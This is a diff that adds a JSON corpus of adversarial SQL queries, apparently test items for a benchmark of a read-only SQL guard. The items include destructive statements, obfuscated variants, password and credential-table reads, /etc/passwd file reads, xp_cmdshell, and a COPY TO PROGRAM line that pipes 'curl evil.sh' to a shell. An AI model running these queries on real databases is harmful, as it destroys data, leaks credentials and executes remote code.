@@ -1,0 +1,692 @@
+[
+ {
+  "category": "destructive",
+  "dialect": "sqlite",
+  "sql": "DROP TABLE customers",
+  "note": ""
+ },
+ {
+  "category": "destructive",
+  "dialect": "sqlite",
+  "sql": "DELETE FROM customers",
+  "note": ""
+ },
+ {
+  "category": "destructive",
+  "dialect": "sqlite",
+  "sql": "DELETE FROM customers WHERE 1=1",
+  "note": ""
+ },
+ {
+  "category": "destructive",
+  "dialect": "sqlite",
+  "sql": "UPDATE customers SET email='x'",
+  "note": ""
+ },
+ {
+  "category": "destructive",
+  "dialect": "sqlite",
+  "sql": "UPDATE orders SET total=0 WHERE id>0",
+  "note": ""
+ },
+ {
+  "category": "destructive",
+  "dialect": "sqlite",
+  "sql": "INSERT INTO customers(name) VALUES ('evil')",
+  "note": ""
+ },
+ {
+  "category": "destructive",
+  "dialect": "sqlite",
+  "sql": "INSERT INTO orders SELECT * FROM orders",
+  "note": ""
+ },
+ {
+  "category": "destructive",
+  "dialect": "sqlite",
+  "sql": "ALTER TABLE customers ADD COLUMN pwned TEXT",
+  "note": ""
+ },
+ {
+  "category": "destructive",
+  "dialect": "sqlite",
+  "sql": "CREATE TABLE evil AS SELECT * FROM customers",
+  "note": ""
+ },
+ {
+  "category": "destructive",
+  "dialect": "sqlite",
+  "sql": "CREATE VIEW v AS SELECT * FROM customers",
+  "note": ""
+ },
+ {
+  "category": "destructive",
+  "dialect": "sqlite",
+  "sql": "TRUNCATE TABLE orders",
+  "note": ""
+ },
+ {
+  "category": "destructive",
+  "dialect": "sqlite",
+  "sql": "REPLACE INTO customers VALUES (1,'x')",
+  "note": ""
+ },
+ {
+  "category": "destructive",
+  "dialect": "sqlite",
+  "sql": "DROP VIEW IF EXISTS v",
+  "note": ""
+ },
+ {
+  "category": "destructive",
+  "dialect": "sqlite",
+  "sql": "DROP INDEX idx_orders",
+  "note": ""
+ },
+ {
+  "category": "destructive",
+  "dialect": "sqlite",
+  "sql": "CREATE TRIGGER t AFTER INSERT ON orders BEGIN DELETE FROM customers; END",
+  "note": ""
+ },
+ {
+  "category": "destructive",
+  "dialect": "postgres",
+  "sql": "MERGE INTO customers USING orders ON 1=1 WHEN MATCHED THEN DELETE",
+  "note": ""
+ },
+ {
+  "category": "destructive",
+  "dialect": "postgres",
+  "sql": "TRUNCATE orders RESTART IDENTITY",
+  "note": ""
+ },
+ {
+  "category": "stacked_statements",
+  "dialect": "sqlite",
+  "sql": "SELECT 1; DROP TABLE customers",
+  "note": ""
+ },
+ {
+  "category": "stacked_statements",
+  "dialect": "sqlite",
+  "sql": "SELECT * FROM customers; DELETE FROM orders",
+  "note": ""
+ },
+ {
+  "category": "stacked_statements",
+  "dialect": "sqlite",
+  "sql": "SELECT 1;SELECT 2",
+  "note": ""
+ },
+ {
+  "category": "stacked_statements",
+  "dialect": "sqlite",
+  "sql": "SELECT * FROM customers WHERE id=1; UPDATE customers SET name='x'--",
+  "note": ""
+ },
+ {
+  "category": "stacked_statements",
+  "dialect": "sqlite",
+  "sql": "SELECT 1; PRAGMA writable_schema=1",
+  "note": ""
+ },
+ {
+  "category": "obfuscation",
+  "dialect": "sqlite",
+  "sql": "dRoP/**/TaBlE customers",
+  "note": ""
+ },
+ {
+  "category": "obfuscation",
+  "dialect": "sqlite",
+  "sql": "DROP/*x*/TABLE customers",
+  "note": ""
+ },
+ {
+  "category": "obfuscation",
+  "dialect": "sqlite",
+  "sql": "/**/DELETE/**/FROM/**/customers",
+  "note": ""
+ },
+ {
+  "category": "obfuscation",
+  "dialect": "sqlite",
+  "sql": "DE/**/LETE FROM customers",
+  "note": ""
+ },
+ {
+  "category": "obfuscation",
+  "dialect": "sqlite",
+  "sql": "SELECT 1 --\n; DROP TABLE customers",
+  "note": ""
+ },
+ {
+  "category": "obfuscation",
+  "dialect": "sqlite",
+  "sql": "UPDATE\tcustomers\nSET\tname='x'",
+  "note": ""
+ },
+ {
+  "category": "obfuscation",
+  "dialect": "sqlite",
+  "sql": "  \n DROP TABLE customers",
+  "note": ""
+ },
+ {
+  "category": "obfuscation",
+  "dialect": "mysql",
+  "sql": "SELECT 1 /*!50000 UNION SELECT password FROM mysql.user */",
+  "note": "MySQL executable comment"
+ },
+ {
+  "category": "obfuscation",
+  "dialect": "mysql",
+  "sql": "SELECT * FROM customers WHERE name='a'; DROP TABLE customers; --'",
+  "note": ""
+ },
+ {
+  "category": "hidden_dml",
+  "dialect": "postgres",
+  "sql": "WITH x AS (SELECT 1) INSERT INTO customers(name) SELECT 'a' FROM x",
+  "note": ""
+ },
+ {
+  "category": "hidden_dml",
+  "dialect": "postgres",
+  "sql": "WITH d AS (DELETE FROM orders RETURNING *) SELECT * FROM d",
+  "note": ""
+ },
+ {
+  "category": "hidden_dml",
+  "dialect": "postgres",
+  "sql": "WITH u AS (UPDATE customers SET name='x' RETURNING *) SELECT * FROM u",
+  "note": ""
+ },
+ {
+  "category": "hidden_dml",
+  "dialect": "postgres",
+  "sql": "SELECT * FROM (INSERT INTO t VALUES (1) RETURNING *) z",
+  "note": ""
+ },
+ {
+  "category": "hidden_dml",
+  "dialect": "postgres",
+  "sql": "SELECT * INTO backup FROM customers",
+  "note": "SELECT INTO creates a table"
+ },
+ {
+  "category": "hidden_dml",
+  "dialect": "postgres",
+  "sql": "SELECT * FROM customers FOR UPDATE",
+  "note": "row locks"
+ },
+ {
+  "category": "hidden_dml",
+  "dialect": "postgres",
+  "sql": "SELECT * FROM customers FOR SHARE",
+  "note": "row locks"
+ },
+ {
+  "category": "file_os_access",
+  "dialect": "sqlite",
+  "sql": "SELECT load_extension('/tmp/evil.so')",
+  "note": ""
+ },
+ {
+  "category": "file_os_access",
+  "dialect": "sqlite",
+  "sql": "SELECT readfile('/etc/passwd')",
+  "note": ""
+ },
+ {
+  "category": "file_os_access",
+  "dialect": "sqlite",
+  "sql": "SELECT writefile('/tmp/x', 'data')",
+  "note": ""
+ },
+ {
+  "category": "file_os_access",
+  "dialect": "sqlite",
+  "sql": "SELECT edit('x')",
+  "note": ""
+ },
+ {
+  "category": "file_os_access",
+  "dialect": "postgres",
+  "sql": "SELECT pg_read_file('/etc/passwd')",
+  "note": ""
+ },
+ {
+  "category": "file_os_access",
+  "dialect": "postgres",
+  "sql": "SELECT pg_ls_dir('/')",
+  "note": ""
+ },
+ {
+  "category": "file_os_access",
+  "dialect": "postgres",
+  "sql": "SELECT lo_import('/etc/passwd')",
+  "note": ""
+ },
+ {
+  "category": "file_os_access",
+  "dialect": "postgres",
+  "sql": "COPY customers TO '/tmp/out.csv'",
+  "note": ""
+ },
+ {
+  "category": "file_os_access",
+  "dialect": "postgres",
+  "sql": "COPY (SELECT * FROM customers) TO PROGRAM 'curl evil.sh | sh'",
+  "note": ""
+ },
+ {
+  "category": "file_os_access",
+  "dialect": "mysql",
+  "sql": "SELECT LOAD_FILE('/etc/passwd')",
+  "note": ""
+ },
+ {
+  "category": "file_os_access",
+  "dialect": "mysql",
+  "sql": "SELECT * FROM customers INTO OUTFILE '/tmp/x'",
+  "note": ""
+ },
+ {
+  "category": "file_os_access",
+  "dialect": "mysql",
+  "sql": "SELECT * FROM customers INTO DUMPFILE '/tmp/x'",
+  "note": ""
+ },
+ {
+  "category": "file_os_access",
+  "dialect": "mysql",
+  "sql": "LOAD DATA INFILE '/etc/passwd' INTO TABLE customers",
+  "note": ""
+ },
+ {
+  "category": "file_os_access",
+  "dialect": "postgres",
+  "sql": "SELECT dblink('host=evil','select 1')",
+  "note": ""
+ },
+ {
+  "category": "file_os_access",
+  "dialect": "postgres",
+  "sql": "SELECT * FROM dblink('host=evil','select 1') AS t(a int)",
+  "note": ""
+ },
+ {
+  "category": "denial_of_service",
+  "dialect": "mysql",
+  "sql": "SELECT SLEEP(30)",
+  "note": ""
+ },
+ {
+  "category": "denial_of_service",
+  "dialect": "postgres",
+  "sql": "SELECT pg_sleep(30)",
+  "note": ""
+ },
+ {
+  "category": "denial_of_service",
+  "dialect": "mysql",
+  "sql": "SELECT BENCHMARK(100000000, MD5('x'))",
+  "note": ""
+ },
+ {
+  "category": "denial_of_service",
+  "dialect": "sqlite",
+  "sql": "SELECT randomblob(1000000000)",
+  "note": ""
+ },
+ {
+  "category": "denial_of_service",
+  "dialect": "sqlite",
+  "sql": "SELECT zeroblob(2000000000)",
+  "note": ""
+ },
+ {
+  "category": "denial_of_service",
+  "dialect": "postgres",
+  "sql": "SELECT * FROM generate_series(1,1000000000)",
+  "note": ""
+ },
+ {
+  "category": "denial_of_service",
+  "dialect": "mysql",
+  "sql": "SELECT REPEAT('a', 1000000000)",
+  "note": ""
+ },
+ {
+  "category": "denial_of_service",
+  "dialect": "postgres",
+  "sql": "SELECT pg_sleep_for('1 hour')",
+  "note": ""
+ },
+ {
+  "category": "denial_of_service",
+  "dialect": "mysql",
+  "sql": "SELECT GET_LOCK('x', 600)",
+  "note": ""
+ },
+ {
+  "category": "denial_of_service",
+  "dialect": "sqlite",
+  "sql": "SELECT * FROM customers a JOIN customers b JOIN customers c JOIN customers d JOIN customers e JOIN customers f JOIN customers g JOIN customers h JOIN customers i JOIN customers j",
+  "note": "10 joins: cartesian explosion"
+ },
+ {
+  "category": "denial_of_service",
+  "dialect": "sqlite",
+  "sql": "SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM customers) a) b) c) d) e",
+  "note": "over-nested"
+ },
+ {
+  "category": "catalog_exfiltration",
+  "dialect": "sqlite",
+  "sql": "SELECT * FROM sqlite_master",
+  "note": ""
+ },
+ {
+  "category": "catalog_exfiltration",
+  "dialect": "sqlite",
+  "sql": "SELECT sql FROM sqlite_master WHERE type='table'",
+  "note": ""
+ },
+ {
+  "category": "catalog_exfiltration",
+  "dialect": "sqlite",
+  "sql": "SELECT * FROM sqlite_schema",
+  "note": ""
+ },
+ {
+  "category": "catalog_exfiltration",
+  "dialect": "sqlite",
+  "sql": "SELECT name FROM pragma_table_info('customers')",
+  "note": ""
+ },
+ {
+  "category": "catalog_exfiltration",
+  "dialect": "postgres",
+  "sql": "SELECT * FROM information_schema.tables",
+  "note": ""
+ },
+ {
+  "category": "catalog_exfiltration",
+  "dialect": "mysql",
+  "sql": "SELECT * FROM information_schema.columns",
+  "note": ""
+ },
+ {
+  "category": "catalog_exfiltration",
+  "dialect": "postgres",
+  "sql": "SELECT * FROM pg_catalog.pg_user",
+  "note": ""
+ },
+ {
+  "category": "catalog_exfiltration",
+  "dialect": "postgres",
+  "sql": "SELECT * FROM pg_shadow",
+  "note": ""
+ },
+ {
+  "category": "catalog_exfiltration",
+  "dialect": "mysql",
+  "sql": "SELECT user, authentication_string FROM mysql.user",
+  "note": ""
+ },
+ {
+  "category": "catalog_exfiltration",
+  "dialect": "postgres",
+  "sql": "SELECT * FROM sys.sql_logins",
+  "note": ""
+ },
+ {
+  "category": "catalog_exfiltration",
+  "dialect": "mysql",
+  "sql": "SELECT * FROM performance_schema.threads",
+  "note": ""
+ },
+ {
+  "category": "catalog_exfiltration",
+  "dialect": "postgres",
+  "sql": "SELECT version()",
+  "note": ""
+ },
+ {
+  "category": "catalog_exfiltration",
+  "dialect": "sqlite",
+  "sql": "SELECT sqlite_version()",
+  "note": ""
+ },
+ {
+  "category": "catalog_exfiltration",
+  "dialect": "postgres",
+  "sql": "SELECT current_user",
+  "note": ""
+ },
+ {
+  "category": "catalog_exfiltration",
+  "dialect": "postgres",
+  "sql": "SELECT current_setting('data_directory')",
+  "note": ""
+ },
+ {
+  "category": "privilege_session",
+  "dialect": "postgres",
+  "sql": "GRANT ALL ON customers TO public",
+  "note": ""
+ },
+ {
+  "category": "privilege_session",
+  "dialect": "postgres",
+  "sql": "REVOKE SELECT ON customers FROM bob",
+  "note": ""
+ },
+ {
+  "category": "privilege_session",
+  "dialect": "mysql",
+  "sql": "SET GLOBAL max_connections=1",
+  "note": ""
+ },
+ {
+  "category": "privilege_session",
+  "dialect": "postgres",
+  "sql": "SET ROLE postgres",
+  "note": ""
+ },
+ {
+  "category": "privilege_session",
+  "dialect": "postgres",
+  "sql": "SELECT set_config('log_statement','all',false)",
+  "note": ""
+ },
+ {
+  "category": "privilege_session",
+  "dialect": "mysql",
+  "sql": "KILL 1",
+  "note": ""
+ },
+ {
+  "category": "privilege_session",
+  "dialect": "mysql",
+  "sql": "USE mysql",
+  "note": ""
+ },
+ {
+  "category": "privilege_session",
+  "dialect": "sqlite",
+  "sql": "ATTACH DATABASE '/tmp/x.db' AS x",
+  "note": ""
+ },
+ {
+  "category": "privilege_session",
+  "dialect": "sqlite",
+  "sql": "DETACH DATABASE x",
+  "note": ""
+ },
+ {
+  "category": "privilege_session",
+  "dialect": "sqlite",
+  "sql": "PRAGMA writable_schema=ON",
+  "note": ""
+ },
+ {
+  "category": "privilege_session",
+  "dialect": "sqlite",
+  "sql": "PRAGMA journal_mode=DELETE",
+  "note": ""
+ },
+ {
+  "category": "privilege_session",
+  "dialect": "sqlite",
+  "sql": "VACUUM",
+  "note": ""
+ },
+ {
+  "category": "privilege_session",
+  "dialect": "sqlite",
+  "sql": "VACUUM INTO '/tmp/copy.db'",
+  "note": ""
+ },
+ {
+  "category": "privilege_session",
+  "dialect": "sqlite",
+  "sql": "BEGIN; DELETE FROM customers; COMMIT",
+  "note": ""
+ },
+ {
+  "category": "privilege_session",
+  "dialect": "sqlite",
+  "sql": "EXPLAIN SELECT 1",
+  "note": ""
+ },
+ {
+  "category": "privilege_session",
+  "dialect": "mysql",
+  "sql": "CALL drop_everything()",
+  "note": ""
+ },
+ {
+  "category": "privilege_session",
+  "dialect": "tsql",
+  "sql": "EXEC xp_cmdshell 'dir'",
+  "note": ""
+ },
+ {
+  "category": "privilege_session",
+  "dialect": "postgres",
+  "sql": "DO $$ BEGIN DELETE FROM customers; END $$",
+  "note": ""
+ },
+ {
+  "category": "privilege_session",
+  "dialect": "postgres",
+  "sql": "ANALYZE customers",
+  "note": ""
+ },
+ {
+  "category": "policy_violation",
+  "dialect": "sqlite",
+  "sql": "SELECT password_hash FROM users",
+  "note": "needs the benchmark policy: users.password_hash and employees.ssn denied; audit_secrets/payroll not allowed"
+ },
+ {
+  "category": "policy_violation",
+  "dialect": "sqlite",
+  "sql": "SELECT u.password_hash FROM users u",
+  "note": "needs the benchmark policy: users.password_hash and employees.ssn denied; audit_secrets/payroll not allowed"
+ },
+ {
+  "category": "policy_violation",
+  "dialect": "sqlite",
+  "sql": "SELECT * FROM users",
+  "note": "needs the benchmark policy: users.password_hash and employees.ssn denied; audit_secrets/payroll not allowed"
+ },
+ {
+  "category": "policy_violation",
+  "dialect": "sqlite",
+  "sql": "SELECT ssn FROM employees",
+  "note": "needs the benchmark policy: users.password_hash and employees.ssn denied; audit_secrets/payroll not allowed"
+ },
+ {
+  "category": "policy_violation",
+  "dialect": "sqlite",
+  "sql": "SELECT name, ssn FROM employees",
+  "note": "needs the benchmark policy: users.password_hash and employees.ssn denied; audit_secrets/payroll not allowed"
+ },
+ {
+  "category": "policy_violation",
+  "dialect": "sqlite",
+  "sql": "SELECT * FROM employees",
+  "note": "needs the benchmark policy: users.password_hash and employees.ssn denied; audit_secrets/payroll not allowed"
+ },
+ {
+  "category": "policy_violation",
+  "dialect": "sqlite",
+  "sql": "SELECT secret_notes FROM audit_secrets",
+  "note": "needs the benchmark policy: users.password_hash and employees.ssn denied; audit_secrets/payroll not allowed"
+ },
+ {
+  "category": "policy_violation",
+  "dialect": "sqlite",
+  "sql": "SELECT id FROM payroll",
+  "note": "needs the benchmark policy: users.password_hash and employees.ssn denied; audit_secrets/payroll not allowed"
+ },
+ {
+  "category": "policy_violation",
+  "dialect": "sqlite",
+  "sql": "SELECT * FROM customers UNION SELECT * FROM users",
+  "note": "needs the benchmark policy: users.password_hash and employees.ssn denied; audit_secrets/payroll not allowed"
+ },
+ {
+  "category": "malformed",
+  "dialect": "sqlite",
+  "sql": "",
+  "note": ""
+ },
+ {
+  "category": "malformed",
+  "dialect": "sqlite",
+  "sql": "   ",
+  "note": ""
+ },
+ {
+  "category": "malformed",
+  "dialect": "sqlite",
+  "sql": "';--",
+  "note": ""
+ },
+ {
+  "category": "malformed",
+  "dialect": "sqlite",
+  "sql": "SELECT FROM WHERE",
+  "note": ""
+ },
+ {
+  "category": "malformed",
+  "dialect": "sqlite",
+  "sql": "@@version",
+  "note": ""
+ },
+ {
+  "category": "malformed",
+  "dialect": "sqlite",
+  "sql": "SELECT * FROM",
+  "note": ""
+ },
+ {
+  "category": "malformed",
+  "dialect": "sqlite",
+  "sql": "DROP",
+  "note": ""
+ },
+ {
+  "category": "malformed",
+  "dialect": "sqlite",
+  "sql": "\u0000SELECT 1",
+  "note": ""
+ }
+]
